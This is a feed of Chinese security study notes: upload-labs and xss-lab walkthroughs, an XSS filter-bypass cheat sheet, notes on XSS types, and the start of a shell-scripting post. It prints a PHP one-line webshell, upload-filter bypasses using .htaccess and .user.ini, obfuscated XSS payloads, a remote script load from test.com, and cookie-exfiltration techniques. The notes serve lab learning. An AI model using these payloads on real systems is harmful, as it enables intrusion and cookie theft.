      <url>/2025/01/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/image-20250117102342080.png">)</p><p>前端检测</p><p><strong><code>onsumbit=checkFile()</code><strong>：</strong>调用js函数来检查上传文件的扩展名。</strong></p><p><code>&lt;?php</code><br><code>@eval($_POST[&#39;cmd&#39;]);</code><br><code>?&gt;</code></p><p>修改后缀名为jpg，burpsuit抓包改后缀名改为php。</p><h1 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h1><p>后端检测</p><p>做法同Pass-01</p><h1 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h1><p>黑名单限制</p><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/image-20250117115535535.png"></p><p>burpsuit抓包改后缀名改为phtml。</p><h1 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h1><p>黑名单限制大部分后缀</p><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/image-20250117120934657.png"></p><p><code>.htaccess文件</code>（分布式配置文件）：提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。</p><p>创建一个<code>.hatacess</code>文件上传</p><p>AddType application&#x2F;x-httpd-php .jpg</p><p>无论什么文件只要包含了jpg都视为php来解析</p><p>在上传带有一句话木马的jpg文件</p><h1 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h1><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/image-20250117122414394.png"></p><p>法一：在php后面加上“。。”</p><p>法二：<code>.user.ini</code>文件：<code>php.ini</code>是php的全局配置文件，对整个web服务起作用，<code>.user.ini</code>和<code>.htaccess</code>都是目录的配置文件，<code>.user.ini</code>是用户自定义的<code>php.ini</code>。</p><p>在<code>.user.ini</code>中写入<code>auto_prepend_file=attack.png</code></p><h1 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h1><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/image-20250117130539184.png"></p><p>大小写绕过</p><h1 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h1><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/image-20250117130728241.png"></p><p>空格绕过</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>xss-lab</title>
      <link href="/2025/01/22/xss-lab/"/>
      <url>/2025/01/22/xss-lab/</url>
      
        <content type="html"><![CDATA[<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p><code>url?name=&lt;script&gt;alert()&lt;/script&gt;</code></p><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><script>alert()</script><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/image-20241224124219336.png"></p><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/image-20241224124240919.png"></p><p>闭合双引号</p><p>“&gt;<script>alert()</script>&lt;”</p><h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><script>alert()</script><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/image-20241224124517934.png"></p><p>‘ onfocus&#x3D;javascript:alert() ‘</p><p>再点击输入框</p><h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/image-20241224124748829.png"></p><p>“ onfocus&#x3D;javascript:alert() “</p><p>再点击输入框</p><h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/image-20241224124948251.png"></p><p><code>&quot;&gt;&lt;a href=javascript:alert()&gt;xxx&lt;/a&gt; &lt;&quot;</code></p><h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>“&gt;<script>alert()</script>&lt;”</p><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/image-20241224125402069.png"></p><p>大小写绕过</p><h2 id="“-alert"><a href="#“-alert" class="headerlink" title="“&gt;alert()&lt;”"></a>“&gt;<Script>alert()</Script>&lt;”</h2><h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>“&gt;<Script>alert()</Script>&lt;”</p><p>发现过滤script</p><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-12-25%20183953.png"></p><p>双写</p><p>“&gt;<scrscriptipt>alert()</scrscriptipt>&lt;”</p><h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-12-25%20184403.png"></p><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-12-25%20184338.png"></p><p>发现script被过滤</p><p>尝试</p><p>对<code>javascript:alert()</code>unicode编码</p><p><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;</code></p><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p><code>&lt;script&gt;alert()&lt;/script&gt;</code></p><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-12-25%20185027.png"></p><p>提示链接不合法</p><p><code>&quot;&gt;&lt;http://javascript:alert()&lt;&quot;</code></p><p><img src="https://raw.githubusercontent.com/xdzjldy/1/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-12-25%20185332.png"></p><p>尝试unicode编码</p><p>发现链接不合法</p><p>http:&#x2F;&#x2F;链接合法</p><p>不用闭合前面和后面的双引号</p><p>编码javascript:alert()，然后加上&#x2F;*http:&#x2F;&#x2F;</p><p>无法弹窗</p><p>加上<code>*/ </code>注释掉后续源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/*http://*/`</span><br></pre></td></tr></table></figure><h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>![](C:\Users\xdzjl\AppData\Roaming\Typora\image\屏幕截图 2024-12-25 190428.png)</p><p>发现只有t_sort可以传参</p><p><code>?t_sort=&quot; onfocus =javascript:alert() type=&quot;text</code></p><p>其中type&#x3D;”text为了让输入框显示，而不是hidden</p><p>![](C:\Users\xdzjl\AppData\Roaming\Typora\image\屏幕截图 2024-12-25 191303.png)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>xss绕过总结</title>
      <link href="/2025/01/22/xss%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
      <url>/2025/01/22/xss%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="xss绕过总结"><a href="#xss绕过总结" class="headerlink" title="xss绕过总结"></a>xss绕过总结</h1><h2 id="一、xss-常见标签语句"><a href="#一、xss-常见标签语句" class="headerlink" title="一、xss 常见标签语句"></a>一、xss 常见标签语句</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">`&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;`</span><br><span class="line">`&lt;img src=x onerror=&quot;alert(1)&quot;&gt;`</span><br><span class="line">`&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;`</span><br><span class="line">`&lt;svg onload=javascript:alert(1)&gt;`</span><br><span class="line">`&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;`</span><br></pre></td></tr></table></figure><h2 id="二、xss-常见绕过"><a href="#二、xss-常见绕过" class="headerlink" title="二、xss 常见绕过"></a>二、xss 常见绕过</h2><h3 id="1-编码绕过"><a href="#1-编码绕过" class="headerlink" title="1.编码绕过"></a>1.编码绕过</h3><p>浏览器对 XSS 代码的解析顺序为：**HTML解码 —— URL解码 —— JS解码(只支持UNICODE)**。</p><h4 id="1-html-实体编码"><a href="#1-html-实体编码" class="headerlink" title="1.html 实体编码"></a>1.html 实体编码</h4><p><strong>当可控点为单个标签属性时，可以使用 html 实体编码。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;a href=&quot;可控点&quot;&gt;test&lt;/a&gt;`</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;`</span><br></pre></td></tr></table></figure><p><strong>十进制</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;test&lt;/a&gt;`</span><br></pre></td></tr></table></figure><p><strong>十六进制</strong></p><p><strong>可以不带分号</strong></p><p><strong>可以填充0</strong></p><h4 id="2-url-编码"><a href="#2-url-编码" class="headerlink" title="2.url 编码"></a>2.url 编码</h4><p><strong>当注入点存在 href 或者 src 属性时，可以使用 url 编码。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;`</span><br></pre></td></tr></table></figure><p><strong>注：url 解析过程中，不能对协议类型进行任何的编码操作，所以 javascript: 协议头需要保留。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/a&gt;`</span><br></pre></td></tr></table></figure><p><strong>可以二次编码</strong></p><h4 id="3-js-编码"><a href="#3-js-编码" class="headerlink" title="3.js 编码"></a>3.js 编码</h4><p><strong>解析的时候字符或者字符串仅会被解码为字符串文本或者标识符名称，例如 js 解析器工作的时候将<code>\u0061\u006c\u0065\u0072\u0074</code>进行解码后为<code>alert</code>，而<code>alert</code>是一个有效的标识符名称，它是能被正常解析的。但是像圆括号、双引号、单引号等等这些字符就只能被当作普通的文本，从而导致无法执行。</strong></p><p><strong>由于 js 是最后进行解析的，所以如果混合编码，需要先使用 js 编码再进行 url 编码或者 html 实体编码。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;img src=x onerror=&quot;alert(1)&quot;&gt;`</span><br></pre></td></tr></table></figure><p><strong>Unicode 编码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;img src=x onerror=&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;&gt;`</span><br></pre></td></tr></table></figure><p><strong>注：Unicode 编码时，只能对有效的标识符进行编码，否则非标识符解码后不能解析执行。例如 javascript:alert(1) ，进行 Unicode 编码时，只能对 alert 和 “1” 进行编码，框号编码后会被当成文本字符，不能执行。ascii 八进制和十六进制编码使用时需要 eval、setTimeout等函数传递变量，并且可以对整个传递参数进行编码。例如 eval(“alert(1)”)，可以对 “alert(1)” 整个进行八进制、十六进制或者 Unicode 编码(双引号不参与)。</strong></p><p><strong>八进制和十六进制</strong></p><p>setTimeout() 是属于 window 的方法，该方法用于在指定的毫秒数后调用函数或计算表达式。</p><p>语法：<code>setTimeout(要执行的代码, 等待的毫秒数)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`setTimeout(JavaScript 函数, 等待的毫秒数)`</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;svg/onload=setTimeout(&#x27;\x61\x6C\x65\x72\x74\x28\x31\x29&#x27;)&gt;`</span><br></pre></td></tr></table></figure><h4 id="4-混合编码"><a href="#4-混合编码" class="headerlink" title="4.混合编码"></a>4.混合编码</h4><p><strong>由于浏览器对 xss 代码的解析过程是：html解析 —— url解析 —— js解析，所以可以编码方式进行组合绕过。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">`1. 原代码</span><br><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">2. 对alert进行JS编码（unicode编码）</span><br><span class="line">&lt;a href=&quot;javascript:\u0061\u006c\u0065\u0072\u0074(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">3. 对href标签中的\u0061\u006c\u0065\u0072\u0074进行URL编码</span><br><span class="line">&lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">4. 对href标签中的javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)进行HTML编码：</span><br><span class="line">&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;test&lt;/a&gt;`</span><br></pre></td></tr></table></figure><p><strong>注：href、src等加载url的属性可以使用三种混合编码，on事件可以使用html实体编码和js编码混合，但url编码在on事件中不会解析。</strong></p><h4 id="5-base64-编码"><a href="#5-base64-编码" class="headerlink" title="5.base64 编码"></a>5.base64 编码</h4><p><strong>base64 编码通常需要使用到 data 伪协议。</strong></p><p><strong>data 协议使用方法：<code>data:资源类型;编码,内容</code></strong></p><p>base64编码内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`&lt;script&gt;alert(/xss/)&lt;/script&gt;`</span><br><span class="line">`PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=`</span><br></pre></td></tr></table></figure><p>通常与 base64 编码配合 data 协议的标签有 <strong><object>、<a>、<iframe></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">`1.&lt;object&gt; 标签</span><br><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;</span><br><span class="line">2.&lt;a&gt; 标签</span><br><span class="line">&lt;a href=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;test&lt;/a&gt;   （新版浏览器不支持）</span><br><span class="line">3.&lt;iframe&gt; 标签</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/iframe&gt;`</span><br></pre></td></tr></table></figure><p><strong>atob 函数</strong></p><p>atob() 方法用于解码使用 base-64 编码的字符串。</p><p>语法：<code>window.atob(encodedStr)</code>(encodedStr: 必需，是一个通过 btoa() 方法编码的字符串)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;a href=javascript:eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&gt;test&lt;/a&gt;`</span><br></pre></td></tr></table></figure><h4 id="6-ascii-编码"><a href="#6-ascii-编码" class="headerlink" title="6. ascii 编码"></a>6. ascii 编码</h4><h3 id="2-空格过滤绕过"><a href="#2-空格过滤绕过" class="headerlink" title="2.空格过滤绕过"></a>2.空格过滤绕过</h3><p><code>&lt;html&gt;&lt;img**AA**src**AA**onerror**BB**=**BB**alert**CC**(1)**DD**&lt;/html&gt;</code></p><p>A位置可填充 &#x2F;，&#x2F;123&#x2F;，%09，%0A，%0C，%0D，%20 B位置可填充 %09，%0A，%0C，%0D，%20 C位置可填充 %0B，&#x2F;**&#x2F;，如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20 D位置可填充 %09，%0A，%0C，%0D，%20，&#x2F;&#x2F;，&gt;</p><h3 id="3-圆括号过滤绕过"><a href="#3-圆括号过滤绕过" class="headerlink" title="3.圆括号过滤绕过"></a>3.圆括号过滤绕过</h3><h4 id="1-反引号替换"><a href="#1-反引号替换" class="headerlink" title="1.反引号替换"></a>1.反引号替换</h4><h4 id="2-throw-绕过"><a href="#2-throw-绕过" class="headerlink" title="2.throw 绕过"></a>2.throw 绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`&lt;video src onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;`</span><br><span class="line">`&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;`</span><br></pre></td></tr></table></figure><h3 id="4-单引号过滤绕过"><a href="#4-单引号过滤绕过" class="headerlink" title="4.单引号过滤绕过"></a>4.单引号过滤绕过</h3><h4 id="1-斜杠替换"><a href="#1-斜杠替换" class="headerlink" title="1.斜杠替换"></a>1.斜杠替换</h4><h4 id="2-反引号替换"><a href="#2-反引号替换" class="headerlink" title="2.反引号替换"></a>2.反引号替换</h4><h3 id="5-alert-过滤绕过"><a href="#5-alert-过滤绕过" class="headerlink" title="5.alert 过滤绕过"></a>5.alert 过滤绕过</h3><h4 id="1-prompt-confirm-console-log-document-write替换"><a href="#1-prompt-confirm-console-log-document-write替换" class="headerlink" title="1.prompt,confirm,console.log,document.write替换"></a>1.<code>prompt,confirm,console.log,document.write</code>替换</h4><h4 id="2-base64-绕过"><a href="#2-base64-绕过" class="headerlink" title="2.base64 绕过"></a>2.base64 绕过</h4><h3 id="6-关键词置空绕过"><a href="#6-关键词置空绕过" class="headerlink" title="6.关键词置空绕过"></a>6.关键词置空绕过</h3><h4 id="1-大小写绕过"><a href="#1-大小写绕过" class="headerlink" title="1.大小写绕过"></a>1.大小写绕过</h4><h4 id="2-嵌套绕过"><a href="#2-嵌套绕过" class="headerlink" title="2.嵌套绕过"></a>2.嵌套绕过</h4><h3 id="7-函数拼接"><a href="#7-函数拼接" class="headerlink" title="7.函数拼接"></a>7.函数拼接</h3><h4 id="1-eval-top-window-self-parent-frames"><a href="#1-eval-top-window-self-parent-frames" class="headerlink" title="1.eval,top,window,self,parent,frames"></a>1.<code>eval,top,window,self,parent,frames</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;al&#x27;+&#x27;ert(1)&#x27;)&quot;&gt;`</span><br></pre></td></tr></table></figure><h4 id="2-常用函数"><a href="#2-常用函数" class="headerlink" title="2.常用函数"></a>2.常用函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;img src=&quot;x&quot; onerror=&quot;eval(alert(1))&quot;&gt;`</span><br></pre></td></tr></table></figure><h3 id="8-赋值拼接"><a href="#8-赋值拼接" class="headerlink" title="8.赋值拼接"></a>8.赋值拼接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;img src onerror=_=alert,_(1)&gt;`</span><br></pre></td></tr></table></figure><h3 id="9-拆分法"><a href="#9-拆分法" class="headerlink" title="9.拆分法"></a>9.拆分法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">`&lt;script&gt;a=&#x27;document.write(&quot;&#x27;&lt;/script&gt;`</span><br><span class="line">`&lt;script&gt;a=a+&#x27;&lt;script src=ht&#x27;&lt;/script&gt;`</span><br><span class="line">`&lt;script&gt;a=a+&#x27;tp://test.com/xs&#x27;&lt;/script&gt;`</span><br><span class="line">`&lt;script&gt;a=a+&#x27;s.js&gt;&lt;/script&gt;&quot;)&#x27;&lt;/script&gt;`</span><br><span class="line">`&lt;script&gt;eval(a)&lt;/script&gt;`</span><br></pre></td></tr></table></figure><p>通过上面的拆分法可以拼凑出下面完整的攻击向量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`document.write(&quot;&lt;script src = http://test.com/xss.js&gt;&lt;/script&gt;&quot;)`</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>xss攻击的分类</title>
      <link href="/2025/01/22/xss%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E7%B1%BB/"/>
      <url>/2025/01/22/xss%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS攻击的分类"><a href="#XSS攻击的分类" class="headerlink" title="XSS攻击的分类"></a>XSS攻击的分类</h1><h2 id="（1）来自内部的攻击"><a href="#（1）来自内部的攻击" class="headerlink" title="（1）来自内部的攻击"></a>（1）来自内部的攻击</h2><p>利用程序自身的漏洞，构造跨站语句</p><h2 id="（2）来自外部的攻击"><a href="#（2）来自外部的攻击" class="headerlink" title="（2）来自外部的攻击"></a>（2）来自外部的攻击</h2><p>自己构造XSS跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。<br>XSS的分类<br>1、反射型(非持久化)：用户点击链接触发。<br>（1）原理<br>攻击者向服务器端注入一段js代码，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。当用户浏览该页面时，嵌入Web里面的Script代码就会被执行。<br>（2）判断是否存在反射型xss漏洞并利用<br>① 判断有没有过滤一些特殊的字符<br>比如对比输出的字符和输出的字符<br>② 注入代码<br>假如我输入的是1，提交后，点击查看网页源代码<br>③ 插入代码<br>“&gt;&lt; img src&#x3D;1 onerror&#x3D;”alert(&#x2F;xss&#x2F;)”&#x2F;&gt; #如果读取图片失败，则用alert显示相关信息<br>显示了信息，则说明存在xss注入<br>④ 利用xss漏洞<br>将刚刚成功注入代码并能触发xss的网址通过电子邮件等方式发送给对方的手中，如果结合xss平台，对方点击了链接，就能得到对方的cookie等信息<br>2、存储型(持久化)<br>（1）原理<br>存储型XSS和反射型XSS的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交XSS代码。<br>（2）payload<br>&lt; img src&#x3D;”1” onerror&#x3D;”alert(&#x2F;xss&#x2F;)”&#x2F;&gt;<br>注入后重新刷新发现直接回显注入的东西，说明是存储型xss<br>3、DOM型<br>（1）原理<br>文档对象模型（DOM）是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分<br>DOM型xss其实是一种特殊类型的反射型xss，也被称作本地跨站，它是基于DOM文档对象模型的一种漏洞。DOM XSS和反射型XSS、存储型XSS的区别在于DOM XSS代码并不需要服务器参与，出发XSS靠的是浏览器的DOM解析，完全是客户端的事情<br>客户端的脚本程序可以通过DOM来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得DOM中的数据后并在本地执行。<br>基于DOM的XSS是反射的特例，其中JavaScript隐藏在URL中，并在其呈现时由页面中的JavaScript取出。<br>（3）payload<br>&lt; img src&#x3D;1 onerror&#x3D;”alert(&#x2F;xss&#x2F;)”&#x2F;&gt;<br>XSS攻击的途径<br>第一种：对普通的用户输入，页面原样输出，攻击者通过对JSCODE的伪装，经过某些特定的操作就会跳出一个木马界面，从而取得登录用户的Cookie.<br>第二种：在代码区内存在有用户输入的内容<br>第三种：允许用户输入HTML标签的页面，用户可以提交一些自定义的HTML代码。</p><h1 id="Cookie-外带"><a href="#Cookie-外带" class="headerlink" title="Cookie 外带"></a>Cookie 外带</h1><h1 id="window-open"><a href="#window-open" class="headerlink" title="window.open"></a>window.open</h1><p><code>window.open()</code> 是 JavaScript 中用于<strong>打开新窗口或新标签页</strong>的方法。它接受一个 URL 作为参数，返回一个新的浏览器窗口对象或者选项卡对象<br>window.open(“<a href="http://www.example.com/">http://www.example.com</a>“);<br>最后相应的cookie以及内容弹回</p><h1 id="fetch"><a href="#fetch" class="headerlink" title="fetch"></a>fetch</h1><p>跨域请求中需要带有cookie时, 可在fetch方法的第二个参数对象中添加credentials属性, 并将值设置为”include”.<br>fetch(url,{<br>  credentials: ‘include’<br>});<br>需要目标服务器可以接受接受跨域发送cookies请求<br>服务器端需要支持Access-Control-Allow-Credentials策略，并设置Access-Control-Allow-Credentials响应头为”true”， 即可允许跨域请求携带 Cookie。</p><h1 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest"></a>XMLHttpRequest</h1><p>XMLHttpRequest发送请求时需要设置withCredentials属性为true,来允许浏览器在自己的域设置cookie值。<br>后台设置Access-Control-Allow-Credentials，设置后必须写跟Request Headers的Origin相同的地址。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/10/11/shell/"/>
      <url>/2024/10/11/shell/</url>
      
        <content type="html"><![CDATA[<h1 id="shell脚本"><a href="#shell脚本" class="headerlink" title="shell脚本"></a><code>shell脚本</code></h1><p>打开文本编辑器(可以使用 vi&#x2F;vim 命令来创建文件)，新建一个文件 test.sh，扩展名为 sh（sh代表shell），扩展名并不影响脚本执行，如果用 php 写 shell 脚本，扩展名就用 php 。<br><code>#!/bin/bash</code><br>echo “Hello World !”<br><code>#! </code>是一个约定的标记，它告诉系统这个脚本需要什么解释器来执行，即使用哪一种 Shell。<br>echo 命令用于向窗口输出文本。</p><h2 id="运行-Shell-脚本有两种方法："><a href="#运行-Shell-脚本有两种方法：" class="headerlink" title="运行 Shell 脚本有两种方法："></a><code>运行 Shell 脚本有两种方法：</code></h2><h3 id="1、作为可执行程序"><a href="#1、作为可执行程序" class="headerlink" title="1、作为可执行程序"></a>1、作为可执行程序</h3><p>将上面的代码保存为<code> test.sh</code>，并 cd 到相应目录：<br><code>chmod +x ./test.sh</code>  #使脚本具有执行权限<br><code>./test.sh</code>  #执行脚本<br>要用 <code>./test.sh </code>告诉系统就在当前目录找。</p><h3 id="2、作为解释器参数"><a href="#2、作为解释器参数" class="headerlink" title="2、作为解释器参数"></a>2、作为解释器参数</h3><p>直接运行解释器，其参数就是 shell 脚本的文件名<br><code>/bin/sh 